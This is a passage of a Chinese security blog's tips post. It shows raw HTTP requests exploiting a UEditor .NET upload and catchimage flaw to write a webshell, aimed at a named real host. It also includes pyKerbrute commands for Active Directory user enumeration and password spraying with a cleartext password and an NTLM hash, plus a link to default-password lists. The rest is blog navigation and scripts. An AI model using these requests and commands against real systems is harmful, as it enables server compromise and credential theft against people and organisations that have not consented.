+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/ueditor/net/controller.ashx?action=uploadimage</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>pmp.csc.com.cn<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=---------------------------19350128512434<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>199<br><br>-----------------------------19350128512434<br>Content-Disposition: form-data; name=&quot;upfile&quot;; filename=&quot;delicious.png&quot;<br>Content-Type: image/png<br><br>123<br>-----------------------------19350128512434--<br></code></pre></td></tr></table></figure></li>
+<li><p>抓取本地图片写入webshell</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/ueditor/net/controller.ashx?action=catchimage</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>pmp.csc.com.cn<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>99<br><br>source%5B%5D=http://127.0.0.1/App_Upload/ueditor/image/20210116/6374641084286323059465749.png?.html<br></code></pre></td></tr></table></figure>
+<ul>
+<li>如果不成就换几个端口试试</li>
+</ul>
+</li>
+</ul>
+<hr>
+<p>常见web系统弱口令</p>
+<p><a target="_blank" rel="noopener" href="http://uuzdaisuki.com/2020/11/09/%E5%B8%B8%E8%A7%81web%E7%B3%BB%E7%BB%9F%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4%E6%80%BB%E7%BB%93/">http://uuzdaisuki.com/2020/11/09/%E5%B8%B8%E8%A7%81web%E7%B3%BB%E7%BB%9F%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4%E6%80%BB%E7%BB%93/</a></p>
+<hr>
+<p>域外枚举以及爆破</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/3gstudent/pyKerbrute">https://github.com/3gstudent/pyKerbrute</a></p>
+<ul>
+<li><p>EnumADUser.py</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">python2</span> <span class="hljs-selector-tag">EnumADUser</span><span class="hljs-selector-class">.py</span> 192.168.60.1 <span class="hljs-selector-tag">test</span><span class="hljs-selector-class">.com</span> <span class="hljs-selector-tag">user</span><span class="hljs-selector-class">.txt</span> <span class="hljs-selector-tag">tcp</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic1mzuLzWX3tEO1rBFlwia1K8S4s95dVSs0fER7MjQEbIiaEFsuUCP5dqgR2SIShMFAviaZbg5YCkqXEA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" alt="Image"></p>
+</li>
+<li><p>ADPwdSpray.py</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">python2</span> <span class="hljs-selector-tag">ADPwdSpray</span><span class="hljs-selector-class">.py</span> 192.168.60.1 <span class="hljs-selector-tag">hacke</span><span class="hljs-selector-class">.testlab</span> <span class="hljs-selector-tag">user</span><span class="hljs-selector-class">.txt</span> <span class="hljs-selector-tag">clearpassword</span> <span class="hljs-selector-tag">QWE123</span>!@# tcp<br></code></pre></td></tr></table></figure>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic1mzuLzWX3tEO1rBFlwia1K8MhnGJnaXW0hYfboxSyolicRQgldr3RKqI47tkJm6K6HB9qWj3nm9YcQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" alt="Image"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python2</span> ADPwdSpray.py <span class="hljs-number">192.168.60.1</span> hacke.testlab user.txt ntlmhash <span class="hljs-number">35</span>c<span class="hljs-number">83173</span>a<span class="hljs-number">6</span>fb<span class="hljs-number">6</span>d<span class="hljs-number">142</span>b<span class="hljs-number">0359381</span>d<span class="hljs-number">5</span>cc<span class="hljs-number">84</span>c udp<br></code></pre></td></tr></table></figure>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic1mzuLzWX3tEO1rBFlwia1K8JZFJSUBVH8wQYnKrhANENic6YG1jo9ckMLuNF6qQIyQGWdx3fMPUMzw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" alt="Image"></p>
+</li>
+</ul>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/Web/">Web</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Tips/">Tips</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/02/05/lan_fan_qie/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">烂番茄提权</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/02/03/kerberos/">
+                        <span class="hidden-mobile">KERBEROS详解</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
